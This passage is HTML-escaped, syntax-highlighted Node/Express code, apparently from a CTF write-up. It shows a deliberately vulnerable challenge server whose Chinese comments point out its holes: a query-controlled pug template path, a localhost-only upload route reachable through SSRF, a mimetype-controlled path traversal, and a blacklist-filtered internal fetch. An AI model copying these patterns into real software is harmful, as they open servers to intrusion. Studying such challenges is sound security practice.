&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">action&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">req&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">query&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">action&lt;/span>&lt;span style="color:#f92672">?&lt;/span>&lt;span style="color:#75af00">req&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">query&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">action&lt;/span>&lt;span style="color:#f92672">:&lt;/span>&lt;span style="color:#d88200">&amp;#34;index&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#75715e">// action参数
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span> &lt;span style="color:#75af00">action&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">includes&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;/&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#f92672">||&lt;/span> &lt;span style="color:#75af00">action&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">includes&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;\\&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">){&lt;/span> &lt;span style="color:#75715e">// 不能有/ \
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75af00">res&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">send&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Errrrr, You have been Blocked&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">file&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">path&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">join&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">__dirname&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#d88200">&amp;#39;/template/&amp;#39;&lt;/span>&lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#75af00">action&lt;/span> &lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#d88200">&amp;#39;.pug&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">html&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">pug&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">renderFile&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">file&lt;/span>&lt;span style="color:#111">);&lt;/span> &lt;span style="color:#75715e">// 模板渲染
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75af00">res&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">send&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">html&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">});&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">app&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">post&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/file_upload&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">req&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">res&lt;/span>&lt;span style="color:#111">){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">ip&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">req&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">connection&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">remoteAddress&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">obj&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">msg&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#d88200">&amp;#39;&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#f92672">!&lt;/span>&lt;span style="color:#75af00">ip&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">includes&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;127.0.0.1&amp;#39;&lt;/span>&lt;span style="color:#111">))&lt;/span> &lt;span style="color:#111">{&lt;/span> &lt;span style="color:#75715e">// 需要SSRF
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75af00">obj&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">msg&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;only admin&amp;#39;s ip can use it&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">res&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">send&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">JSON&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">stringify&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">obj&lt;/span>&lt;span style="color:#111">));&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">fs&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">readFile&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">req&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">files&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">].&lt;/span>&lt;span style="color:#75af00">path&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">err&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">data&lt;/span>&lt;span style="color:#111">){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">err&lt;/span>&lt;span style="color:#111">){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">obj&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">msg&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;upload failed&amp;#39;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">res&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">send&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">JSON&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">stringify&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">obj&lt;/span>&lt;span style="color:#111">));&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>&lt;span style="color:#00a8c8">else&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">file_path&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;/uploads/&amp;#39;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#75af00">req&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">files&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">].&lt;/span>&lt;span style="color:#75af00">mimetype&lt;/span> &lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#d88200">&amp;#34;/&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#75715e">// 路径确定 mimetype可控 路径穿越
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">file_name&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">req&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">files&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">].&lt;/span>&lt;span style="color:#75af00">originalname&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">dir_file&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">__dirname&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#75af00">file_path&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#75af00">file_name&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#f92672">!&lt;/span>&lt;span style="color:#75af00">fs&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">existsSync&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">__dirname&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#75af00">file_path&lt;/span>&lt;span style="color:#111">)){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">try&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">fs&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">mkdirSync&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">__dirname&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#75af00">file_path&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span> &lt;span style="color:#00a8c8">catch&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">error&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">obj&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">msg&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;file type error&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">res&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">send&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">JSON&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">stringify&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">obj&lt;/span>&lt;span style="color:#111">));&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">try&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">fs&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">writeFileSync&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">dir_file&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#75af00">data&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">obj&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">msg&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#d88200">&amp;#39;upload success&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">filename&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#75af00">file_path&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#75af00">file_name&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span> &lt;span style="color:#00a8c8">catch&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">error&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">obj&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">msg&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;upload failed&amp;#39;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">res&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">send&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">JSON&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">stringify&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">obj&lt;/span>&lt;span style="color:#111">));&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">})&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">})&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">app&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/source&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">req&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">res&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span> &lt;span style="color:#75715e">// 源码
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75af00">res&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">sendFile&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">path&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">join&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">__dirname&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#d88200">&amp;#39;/template/source.txt&amp;#39;&lt;/span>&lt;span style="color:#111">));&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">});&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">app&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/core&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">req&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">res&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">q&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">req&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">query&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">q&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#75715e">// q参数
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">resp&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">q&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">url&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;http://localhost:8081/source?&amp;#39;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#75af00">q&lt;/span> &lt;span style="color:#75715e">// 可控端点
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75af00">console&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">log&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">url&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">trigger&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">blacklist&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">url&lt;/span>&lt;span style="color:#111">);&lt;/span> &lt;span style="color:#75715e">// 黑名单过滤
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">trigger&lt;/span> &lt;span style="color:#f92672">===&lt;/span> &lt;span style="color:#00a8c8">true&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">res&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">send&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;&amp;lt;p&amp;gt;error occurs!&amp;lt;/p&amp;gt;&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span> &lt;span style="color:#00a8c8">else&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">try&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">http&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">url&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">resp&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">resp&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">setEncoding&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;utf8&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">resp&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">on&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;error&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">err&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">err&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">code&lt;/span> &lt;span style="color:#f92672">===&lt;/span> &lt;span style="color:#d88200">&amp;#34;ECONNRESET&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">console&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">log&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Timeout occurs&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">});&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">resp&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">on&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;data&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">chunk&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">try&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">resps&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">chunk&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">toString&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">res&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">send&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">resps&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>&lt;span style="color:#00a8c8">catch&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">e&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">res&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">send&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">e&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">message&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}).&lt;/span>&lt;span style="color:#75af00">on&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;error&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">e&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">=&amp;gt;&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">res&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">send&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">e&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">message&lt;/span>&lt;span style="color:#111">);});&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">});&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span> &lt;span style="color:#00a8c8">catch&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">error&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">console&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">log&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">error&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
